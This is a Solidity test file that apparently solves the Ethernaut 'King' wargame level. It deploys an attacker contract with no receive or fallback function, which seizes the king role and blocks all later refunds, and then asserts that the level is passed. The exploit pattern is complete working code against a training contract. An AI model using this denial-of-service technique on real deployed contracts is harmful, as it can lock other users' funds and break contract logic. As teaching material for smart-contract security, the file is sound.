pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../King/KingFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract Attacker {
    King king;
    constructor(address payable _king) {
        king = King(_king);
    }

    function attack() public payable {
        (bool result, ) = address(king).call{value: msg.value}("");
        !result;
    }

    // no receive, fallback function
}


contract KingTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory telephoneFactory = new KingFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{ value: 2 ether }(telephoneFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attacker attacker = new Attacker(payable(ethernautKing));
        attacker.attack{ value: 3 ether }();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
